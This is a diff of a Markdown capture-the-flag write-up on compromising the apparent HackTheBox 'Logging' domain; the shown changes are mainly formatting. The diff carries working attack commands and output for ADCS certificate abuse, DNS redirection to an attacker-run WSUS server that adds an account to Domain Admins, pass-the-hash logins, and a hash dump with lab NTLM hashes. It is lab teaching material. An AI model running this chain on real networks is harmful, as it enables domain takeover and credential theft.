0SAPPFWrXU7P8KOVwkw/xkOp8F1TwqhVn+bbHr1bgFaXuscGncIHBWshASanobqty0iNx/SN7BxmAlCO7hqx5GSHxA7IH4188F7ieKVvcrXInn6jpcQzPhtchXmY0YnvY0Mu7dXUw8BCatjdW23ZHAQ8G6YaGPR+0O9kqcMfPo82tIkffRNoJrYDRo4HpMIHmoAMCAQCigd4Egdt9gdgwgdWggdIwgc8wgcygKzApoAMCARKhIgQgYTO9mSJfirf3Z6DaIicdVmCJmWPCFzrSFxtMkJHsmXKhDRsLTE9HR0lORy5IVEKiGzAZoAMCAQGhEjAQGw5qYXlsZWUuY2xpZnRvbqMHAwUAYKEAAKURGA8yMDI2MDQyNDIxMzcwOFqmERgPMjAyNjA0MjUwNzMyMTVapxEYDzIwMjYwNTAxMjEzMjE1WqgNGwtMT0dHSU5HLkhUQqkgMB6gAwIBAqEXMBUbBmtyYnRndBsLTE9HR0lORy5IVEI=**
 ```
 
 - 🔍 *Now save this in a .kirbi file*
@@ -1073,7 +1080,7 @@ echo -n 'BASE64_HERE' | tr -d ' \\r\\n\\t' | base64 -d > jaylee.kirbi
 
 - 🔍 *Convert now*
 
-```bash
+```text
 ticketConverter.py jaylee.kirbi jaylee.ccache
 
 Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its affiliated companies
@@ -1089,7 +1096,9 @@ Impacket v0.14.0.dev0+20251114.155318.8925c2ce - Copyright Fortra, LLC and its a
 export KRB5CCNAME=jaylee.ccache
 
 klist
+```
 
+```text
 Ticket cache: FILE:jaylee.ccache
 
 Default principal: jaylee.clifton@LOGGING.HTB
@@ -1098,7 +1107,7 @@ Valid starting       Expires              Service principal
 
 04/24/2026 21:37:08  04/25/2026 07:32:15  krbtgt/LOGGING.HTB@LOGGING.HTB
 
-&#x20;       renew until 05/01/2026 21:32:15
+        renew until 05/01/2026 21:32:15
 ```
 
 - 🔍 *We are good to enumerate now!*
@@ -1111,142 +1120,144 @@ Valid starting       Expires              Service principal
 C:\\Users\\Public>certutil -v -template UpdateSrv
 
 certutil -v -template UpdateSrv
+```
 
-&#x20; Name: Active Directory Enrollment Policy
+```text
+Name: Active Directory Enrollment Policy
 
-&#x20; Id: {342BA86E-C468-4862-B006-668E3F9B36A0}
+  Id: {342BA86E-C468-4862-B006-668E3F9B36A0}
 
-&#x20; Url: ldap:
+  Url: ldap:
 
 34 Templates:
 
-&#x20; Template[29]:
+  Template[29]:
 
-&#x20; **TemplatePropCommonName = UpdateSrv**
+  **TemplatePropCommonName = UpdateSrv**
 
-&#x20; TemplatePropFriendlyName = UpdateSrv
+  TemplatePropFriendlyName = UpdateSrv
 
-&#x20; TemplatePropEKUs =
-
-1 ObjectIds:
-
-&#x20;   1.3.6.1.5.5.7.3.1 Server Authentication
-
-&#x20; TemplatePropCryptoProviders =
-
-&#x20;   0: Microsoft RSA SChannel Cryptographic Provider
-
-&#x20;   1: Microsoft DH SChannel Cryptographic Provider
-
-&#x20; TemplatePropMajorRevision = 64 (100)
-
-&#x20; TemplatePropDescription = Computer
-
-&#x20; TemplatePropSchemaVersion = 2
-
-&#x20; TemplatePropMinorRevision = 3
-
-&#x20; TemplatePropRASignatureCount = 0
-
-&#x20; TemplatePropMinimumKeySize = 800 (2048)
-
-&#x20; TemplatePropOID =
-
-&#x20;   1.3.6.1.4.1.311.21.8.12353791.10602463.14107544.5621390.7746408.154.13283525.179965 UpdateSrv
-
-&#x20; TemplatePropV1ApplicationPolicy =
+  TemplatePropEKUs =
 
 1 ObjectIds:
 
-&#x20;   1.3.6.1.5.5.7.3.1 Server Authentication
+    1.3.6.1.5.5.7.3.1 Server Authentication
 
-&#x20; TemplatePropEnrollmentFlags = 0
+  TemplatePropCryptoProviders =
 
-&#x20; TemplatePropSubjectNameFlags = 1
+    0: Microsoft RSA SChannel Cryptographic Provider
 
-&#x20;   **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1**
+    1: Microsoft DH SChannel Cryptographic Provider
 
-&#x20; TemplatePropPrivateKeyFlags = 1010000 (16842752)
+  TemplatePropMajorRevision = 64 (100)
 
-&#x20;   CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
+  TemplatePropDescription = Computer
 
-&#x20;   TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)
+  TemplatePropSchemaVersion = 2
 
-&#x20;   TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)
+  TemplatePropMinorRevision = 3
 
-&#x20; TemplatePropGeneralFlags = 20241 (131649)
+  TemplatePropRASignatureCount = 0
 
-&#x20;   CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1
+  TemplatePropMinimumKeySize = 800 (2048)
 
-&#x20;   CT_FLAG_MACHINE_TYPE -- 40 (64)
+  TemplatePropOID =
 
-&#x20;   CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
+    1.3.6.1.4.1.311.21.8.12353791.10602463.14107544.5621390.7746408.154.13283525.179965 UpdateSrv
 
-&#x20;   CT_FLAG_IS_MODIFIED -- 20000 (131072)
+  TemplatePropV1ApplicationPolicy =
 
-&#x20; TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-4020823815-2796529489-1682170552-519D:PAI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-4020823815-2796529489-1682170552-2102)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-4020823815-2796529489-1682170552-519)(A;;LCRPRC;;;S-1-5-21-4020823815-2796529489-1682170552-2102)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-4020823815-2796529489-1682170552-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;LA)(A;;LCRPLORC;;;AU)
+1 ObjectIds:
 
-&#x20;   Allow Enroll        logging\\IT
+    1.3.6.1.5.5.7.3.1 Server Authentication
 
-&#x20;   Allow Enroll        logging\\Domain Admins
+  TemplatePropEnrollmentFlags = 0
 
-&#x20;   Allow Enroll        logging\\Enterprise Admins
+  TemplatePropSubjectNameFlags = 1
 
-&#x20;   Allow Read  logging\\IT
+    **CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1**
 
-&#x20;   Allow Full Control  logging\\Domain Admins
+  TemplatePropPrivateKeyFlags = 1010000 (16842752)
 
-&#x20;   Allow Full Control  logging\\Enterprise Admins
+    CTPRIVATEKEY_FLAG_ATTEST_NONE -- 0
 
-&#x20;   Allow Full Control  logging\\Administrator
+    TEMPLATE_SERVER_VER_2003<<CTPRIVATEKEY_FLAG_SERVERVERSION_SHIFT -- 10000 (65536)
 
-&#x20;   Allow Read  NT AUTHORITY\\Authenticated Users
+    TEMPLATE_CLIENT_VER_XP<<CTPRIVATEKEY_FLAG_CLIENTVERSION_SHIFT -- 1000000 (16777216)
 
-&#x20; TemplatePropExtensions =
+  TemplatePropGeneralFlags = 20241 (131649)
+
+    CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT -- 1
+
+    CT_FLAG_MACHINE_TYPE -- 40 (64)
+
+    CT_FLAG_ADD_TEMPLATE_NAME -- 200 (512)
+
+    CT_FLAG_IS_MODIFIED -- 20000 (131072)
+
+  TemplatePropSecurityDescriptor = O:LAG:S-1-5-21-4020823815-2796529489-1682170552-519D:PAI(OA;;CR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-4020823815-2796529489-1682170552-2102)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;DA)(OA;;RPWPCR;0e10c968-78fb-11d2-90d4-00c04f79dc55;;S-1-5-21-4020823815-2796529489-1682170552-519)(A;;LCRPRC;;;S-1-5-21-4020823815-2796529489-1682170552-2102)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;DA)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;S-1-5-21-4020823815-2796529489-1682170552-519)(A;;CCDCLCSWRPWPDTLOSDRCWDWO;;;LA)(A;;LCRPLORC;;;AU)
+
+    Allow Enroll        logging\\IT
+
+    Allow Enroll        logging\\Domain Admins
+
+    Allow Enroll        logging\\Enterprise Admins
+
+    Allow Read  logging\\IT
+
+    Allow Full Control  logging\\Domain Admins
+
+    Allow Full Control  logging\\Enterprise Admins
+
+    Allow Full Control  logging\\Administrator
+
+    Allow Read  NT AUTHORITY\\Authenticated Users
+
+  TemplatePropExtensions =
 
 4 Extensions:
 
-&#x20; Extension[0]:
+  Extension[0]:
 
-&#x20;   1.3.6.1.4.1.311.21.7: Flags = 0, Length = 30
+    1.3.6.1.4.1.311.21.7: Flags = 0, Length = 30
 
-&#x20;   Certificate Template Information
+    Certificate Template Information
 
-&#x20;       Template=UpdateSrv(1.3.6.1.4.1.311.21.8.12353791.10602463.14107544.5621390.7746408.154.13283525.179965)
+        Template=UpdateSrv(1.3.6.1.4.1.311.21.8.12353791.10602463.14107544.5621390.7746408.154.13283525.179965)
 
-&#x20;       Major Version Number=100
+        Major Version Number=100
 
-&#x20;       Minor Version Number=3
+        Minor Version Number=3
 
-&#x20; Extension[1]:
+  Extension[1]:
 
-&#x20;   2.5.29.37: Flags = 0, Length = c
+    2.5.29.37: Flags = 0, Length = c
 
-&#x20;   Enhanced Key Usage
+    Enhanced Key Usage
 
-&#x20;       Server Authentication (1.3.6.1.5.5.7.3.1)
+        Server Authentication (1.3.6.1.5.5.7.3.1)
 
-&#x20; Extension[2]:
+  Extension[2]:
 
-&#x20;   2.5.29.15: Flags = 1(Critical), Length = 4
+    2.5.29.15: Flags = 1(Critical), Length = 4
 
-&#x20;   Key Usage
+    Key Usage
 
-&#x20;       Digital Signature, Key Encipherment (a0)
+        Digital Signature, Key Encipherment (a0)
 
-&#x20; Extension[3]:
+  Extension[3]:
 
-&#x20;   1.3.6.1.4.1.311.21.10: Flags = 0, Length = e
+    1.3.6.1.4.1.311.21.10: Flags = 0, Length = e
 
-&#x20;   Application Policies
+    Application Policies
 
-&#x20;       [1]Application Certificate Policy:
+        [1]Application Certificate Policy:
 
-&#x20;            Policy Identifier=Server Authentication
+             Policy Identifier=Server Authentication
 
-&#x20; TemplatePropValidityPeriod = 10 Years
+  TemplatePropValidityPeriod = 10 Years
 
-&#x20; TemplatePropRenewalPeriod = 6 Weeks
+  TemplatePropRenewalPeriod = 6 Weeks
 
 CertUtil: -Template command completed successfully.
 ```
@@ -1260,24 +1271,26 @@ CertUtil: -Template command completed successfully.
 
 ```bash
 C:\\Users\\Public>.\\Certify.exe request /ca:dc01.logging.htb\\logging-DC01-CA /template:UpdateSrv /altname:Administrator
+```
 
-&#x20;  _____          _   _  __
+```text
+_____          _   _  __
 
-&#x20; / ____|        | | (_)/ _|
+  / ____|        | | (_)/ _|
 
-&#x20;| |     ___ _ __| |_ _| |_ _   _
+ | |     ___ _ __| |_ _| |_ _   _
 
-&#x20;| |    / _ \\ '__| __| |  _| | | |
+ | |    / _ \\ '__| __| |  _| | | |
 
-&#x20;| |___|  __/ |  | |_| | | | |_| |
+ | |___|  __/ |  | |_| | | | |_| |
 
-&#x20; \\_____\\___|_|   \\__|_|_|  \\__, |
+  \\_____\\___|_|   \\__|_|_|  \\__, |
 
-&#x20;                            __/ |
+                             __/ |
 
-&#x20;                           |___./
+                            |___./
 
-&#x20; v1.0.0
+  v1.0.0
 
 [*] Action: Request a Certificates
 
@@ -1327,19 +1340,19 @@ Certify completed in 00:00:05.0553377
 ```text
 PS C:\\ProgramData> .\\Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:Password123! /ptt
 
-&#x20;  ______        _
+   ______        _
 
-&#x20; (  __  )      | |
+  (  __  )      | |
 
-&#x20; | |__) | _   _| |__   ___  _   _  ___
+  | |__) | _   _| |__   ___  _   _  ___
 
-&#x20; |  __  /( ) ( )  _  \\/  _ \( ) ( )  _  \\
+  |  __  /( ) ( )  _  \\/  _ \( ) ( )  _  \\
 
-&#x20; | |  \\ \\| |_| | |_)  |  __/| |_| | ( ) |
+  | |  \\ \\| |_| | |_)  |  __/| |_| | ( ) |
 
-&#x20; (_)  (_)\\____/|_____/\\___| \\____/(_) (_)
+  (_)  (_)\\____/|_____/\\___| \\____/(_) (_)
 
-&#x20; v2.3.3
+  v2.3.3
 
 [*] Action: Ask TGT
 
@@ -1359,33 +1372,31 @@ PS C:\\ProgramData> .\\Rubeus.exe asktgt /user:administrator /certificate:cert.p
 - 🔍 *After Searching for a bit, i have understood why it failed, there are 2 main reasons for that!*
 
 ```text
-&#x09;[1] --> The Subject Identity Mismatch:-
+[1] --> The Subject Identity Mismatch:-
 
-&#x09;		Look closely at the Rubeus output:[*] Using PKINIT with etype rc4_hmac and subject: CN=jaylee.clifton, CN=Users, DC=logging, DC=htb
+			Look closely at the Rubeus output:[*] Using PKINIT with etype rc4_hmac and subject: CN=jaylee.clifton, CN=Users, DC=logging, DC=htb
 
-&#x09;		Even though we supplied /altname:Administrator in our Certify request, the Certificate Authority (CA) completely ignored or stripped that value. The final 				certificate was generated with our low-privileged user identity (jaylee.clifton) inside the Subject field. When Rubeus tried to use that certificate to 				authenticate as the administrator account, the KDC rejected the request because the certificate identity (jaylee.clifton) did not match the requested Kerberos 				principal (administrator).
+			Even though we supplied /altname:Administrator in our Certify request, the Certificate Authority (CA) completely ignored or stripped that value. The final 				certificate was generated with our low-privileged user identity (jaylee.clifton) inside the Subject field. When Rubeus tried to use that certificate to 				authenticate as the administrator account, the KDC rejected the request because the certificate identity (jaylee.clifton) did not match the requested Kerberos 				principal (administrator).
 
-&#x09;[2] --> Missing Extended Key Usage (EKU)
+	[2] --> Missing Extended Key Usage (EKU)
 
-&#x09;		 As confirmed by your earlier certutil scan, the UpdateSrv template is strictly configured for Server Authentication only (1.3.6.1.5.5.7.3.1).
+			 As confirmed by your earlier certutil scan, the UpdateSrv template is strictly configured for Server Authentication only (1.3.6.1.5.5.7.3.1).
 
-&#x09;			For Rubeus to successfully execute asktgt via PKINIT, the certificate must possess either Client Authentication (1.3.6.1.5.5.7.3.2) or Smartcard Logon 					(1.3.6.1.4.1.311.20.2.2).
+				For Rubeus to successfully execute asktgt via PKINIT, the certificate must possess either Client Authentication (1.3.6.1.5.5.7.3.2) or Smartcard Logon 					(1.3.6.1.4.1.311.20.2.2).
 
-&#x09;			Because those properties are missing, the KDC refuses to issue a user session ticket (TGT) using this certificate, regardless of 							the account name specified.
+				Because those properties are missing, the KDC refuses to issue a user session ticket (TGT) using this certificate, regardless of 							the account name specified.
 ```
 
 - 🔍 *Now While looking at the Certutil Output Properly there are 4 attributes aligned!*
 
 ```text
-&#x09;
+1. Enrollee Supplies Subject : True: The requester can define the identity properties of the issued certificate.
 
-&#x09;1. Enrollee Supplies Subject : True: The requester can define the identity properties of the issued certificate.
+	2. Client Authentication : False (or missing): The certificate cannot be used to natively authenticate users via standard Kerberos/PKINIT (ruling out standard ESC1).
 
-&#x09;2. Client Authentication : False (or missing): The certificate cannot be used to natively authenticate users via standard Kerberos/PKINIT (ruling out standard ESC1).
+	3. Server Authentication : True (or specific application policies): The certificate is trusted to prove the cryptographic identity of server endpoints or applications.
 
-&#x09;3. Server Authentication : True (or specific application policies): The certificate is trusted to prove the cryptographic identity of server endpoints or applications.
-
-&#x09;4. CT_FLAG_MACHINE_TYPE is enabled: The template is designed to mint identities for infrastructure objects (computers/servers) rather than human users.
+	4. CT_FLAG_MACHINE_TYPE is enabled: The template is designed to mint identities for infrastructure objects (computers/servers) rather than human users.
 ```
 
 - 🔍 *This Leads to an ESC17 Exposure, as it possess all the attributes.*
@@ -1403,10 +1414,6 @@ PS C:\\ProgramData> .\\Rubeus.exe asktgt /user:administrator /certificate:cert.p
 > [!IMPORTANT]
 > In enterprise environments, administrators create custom templates for specific IT operations. A template named UpdateSrv that is configured as a machine-type template with Server Authentication points directly to the environment's Windows Update Infrastructure (WSUS). The administrator designed this template so the update server could automatically request and renew its own SSL/TLS transport certificate
 
-```text
-&#x09;
-```
-
 - 🔍 *Also WSUS hold a Higher privilege Position in the AD*
 
 > [!IMPORTANT]
@@ -1419,12 +1426,14 @@ PS C:\\ProgramData> .\\Rubeus.exe asktgt /user:administrator /certificate:cert.p
 
 ```bash
 C:\\Windows\\system32>reg query "HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUServer
+```
 
+```text
 reg query "HKLM\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUServer
 
 HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate
 
-&#x20;   **WUServer    REG_SZ    https://wsus.logging.htb:8531**
+    **WUServer    REG_SZ    https://wsus.logging.htb:8531**
 ```
 
 - 🔍 *We have discovered the WSUS!*
@@ -1445,26 +1454,28 @@ meterpreter > upload /home/kali/Tools/Certipy/Ghostpack-CompiledBinaries/Certify
 
 ```bash
 C:\\Users\\Public>Certify.exe request /ca:dc01.logging.htb\\logging-DC01-CA /template:UpdateSrv /altname:wsus.logging.htb
+```
 
+```text
 Certify.exe request /ca:dc01.logging.htb\\logging-DC01-CA /template:UpdateSrv /altname:wsus.logging.htb
 
-&#x20;  _____          _   _  __
+   _____          _   _  __
 
-&#x20; / ____|        | | (_)/ _|
+  / ____|        | | (_)/ _|
 
-&#x20;| |     ___ _ __| |_ _| |_ _   _
+ | |     ___ _ __| |_ _| |_ _   _
 
-&#x20;| |    / _ \\ '__| __| |  _| | | |
+ | |    / _ \\ '__| __| |  _| | | |
 
-&#x20;| |___|  __/ |  | |_| | | | |_| |
+ | |___|  __/ |  | |_| | | | |_| |
 
-&#x20; \\_____\\___|_|   \\__|_|_|  \\__, |
+  \\_____\\___|_|   \\__|_|_|  \\__, |
 
-&#x20;                            __/ |
+                             __/ |
 
-&#x20;                           |___./
+                            |___./
 
-&#x20; v1.0.0
+  v1.0.0
 
 [*] Action: Request a Certificates
 
@@ -1666,11 +1677,11 @@ Verifying - Enter Export Password:
 
 - 🔍 *you can use bloodyAD as well as the native shell of CMD from meterpret as well*
 
+```bash
+bloodyAD --host 10.129.245.130 -d logging.htb -k add dnsRecord wsus 10.10.15.169
+```
+
 ```text
-┌──(venv)─(root㉿fsocity)-[/home/kali]
-
-└─# bloodyAD --host 10.129.245.130 -d logging.htb -k add dnsRecord wsus 10.10.15.169
-
 [+] wsus has been successfully updated
 ```
 
@@ -1696,9 +1707,13 @@ Address: 10.10.15.169
 openssl pkcs12 -in wsus.pfx -clcerts -nokeys -out wsus.crt -nodes
 
 openssl pkcs12 -in wsus.pfx -nocerts -out wsus.key -nodes
+```
 
+```bash
 cat wsus.crt wsus.key > wsus_combined.pem
+```
 
+```text
 (note:- you must ensure that the wsus.logging.htb has the entry inside your /etc/hosts with your IP)
 ```
 
@@ -1707,31 +1722,33 @@ cat wsus.crt wsus.key > wsus_combined.pem
 ```bash
 sudo wsuks --serve-only \\
 
-&#x20;   --WSUS-Server wsus.logging.htb \\
+    --WSUS-Server wsus.logging.htb \\
 
-&#x20;   --tls-cert wsus.pem \\
+    --tls-cert wsus.pem \\
 
-&#x20;   -I tun0 \\
+    -I tun0 \\
 
-&#x20;   -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \\"Domain Admins\\" -Members \\"MSA_HEALTH$\\""'
+    -c '/accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add-ADGroupMember -Identity \\"Domain Admins\\" -Members \\"MSA_HEALTH$\\""'
+```
 
-&#x20;   __          __ _____  _    _  _  __  _____
+```text
+__          __ _____  _    _  _  __  _____
 
-&#x20;   \\ \\        / // ____|| |  | || |/ / / ____|
+    \\ \\        / // ____|| |  | || |/ / / ____|
 
-&#x20;    \\ \\  /\\  / /| (___  | |  | || ' / | (___
+     \\ \\  /\\  / /| (___  | |  | || ' / | (___
 
-&#x20;     \\ \\/  \\/ /  \\___ \\ | |  | ||  <   \\___ \\
+      \\ \\/  \\/ /  \\___ \\ | |  | ||  <   \\___ \\
 
-&#x20;      \\  /\\  /   ____) || |__| || . \\  ____) |
+       \\  /\\  /   ____) || |__| || . \\  ____) |
 
-&#x20;       \\/  \\/   |_____/  \\____/ |_|\\_\\|_____/
+        \\/  \\/   |_____/  \\____/ |_|\\_\\|_____/
 
-&#x20;    Pentesting Tool for the WSUS MITM Attack
+     Pentesting Tool for the WSUS MITM Attack
 
-&#x20;              Made by NeffIsBack
+               Made by NeffIsBack
 
-&#x20;                version: 1.2.1
+                 version: 1.2.1
 
 [+] Command to execute:
 
@@ -1766,12 +1783,12 @@ PsExec64.exe /accepteula /s powershell.exe -ExecutionPolicy Bypass -Command "Add
 
 ```bash
 evil-winrm -i dc01.logging.htb -u 'msa_health$' -H 603fc24ee01a9409f83c9d1d701485c5
+```
 
+```text
 *Evil-WinRM* PS C:\\Users\\msa_health$\\Documents> whoami /priv
 
 PRIVILEGES INFORMATION
-
-\----------------------
 
 Privilege Name                            Description                                                        State
 
@@ -1835,7 +1852,7 @@ SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for anot
 ```text
 *Evil-WinRM* PS C:\\users> dir toby.brynleigh\\desktop
 
-&#x20;   Directory: C:\\users\\toby.brynleigh\\desktop
+    Directory: C:\\users\\toby.brynleigh\\desktop
 
 Mode                LastWriteTime         Length Name
 
@@ -1846,10 +1863,6 @@ Mode                LastWriteTime         Length Name
 
 - 🔍 *Domain Compromised!*
 
-```text
-\--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-```
-
 ## Step 4 - Post Exploitation
 
 - 🔍 *With the MSA_HEALTH being a member of domain admins, we can dump the hashes*
@@ -1857,9 +1870,9 @@ Mode                LastWriteTime         Length Name
 ```text
 secretsdump.py \\
 
-&#x20;   -hashes :603fc24ee01a9409f83c9d1d701485c5 \\
+    -hashes :603fc24ee01a9409f83c9d1d701485c5 \\
 
-&#x20;   'logging.htb/msa_health$@dc01.logging.htb'
+    'logging.htb/msa_health$@dc01.logging.htb'
 
 [*] Querying offset from: logging.htb
 
@@ -1873,7 +1886,7 @@ secretsdump.py \\
 
 oval as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
 
-&#x20; import pkg_resources
+  import pkg_resources
 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
@@ -1900,7 +1913,9 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 getTGT.py logging.htb/Administrator \\
 
 \-hashes ':a0c1d1bed9126632f5f1f2b3f790bdb5'
+```
 
+```bash
 export KRB5CCNAME=Administrator.ccache
 ```
 
@@ -1909,7 +1924,7 @@ export KRB5CCNAME=Administrator.ccache
 ```text
 psexec.py -k -no-pass \\
 
-&#x20;   'LOGGING.HTB/Administrator@dc01.logging.htb'
+    'LOGGING.HTB/Administrator@dc01.logging.htb'
 
 [*] Querying offset from: logging.htb
 
@@ -1923,7 +1938,7 @@ psexec.py -k -no-pass \\
 
 html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
 
-&#x20; import pkg_resources
+  import pkg_resources
 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
@@ -1947,13 +1962,18 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 Microsoft Windows [Version 10.0.17763.8644]
 
 (c) 2018 Microsoft Corporation. All rights reserved.
+```
 
+```bash
 C:\\Windows\\system32> whoami
+```
 
+```text
 nt authority\\system
 ```
 
 - 🔍 *Full Domain Compromised!*
+
 
 ## Mitigations & Security Perspective
 
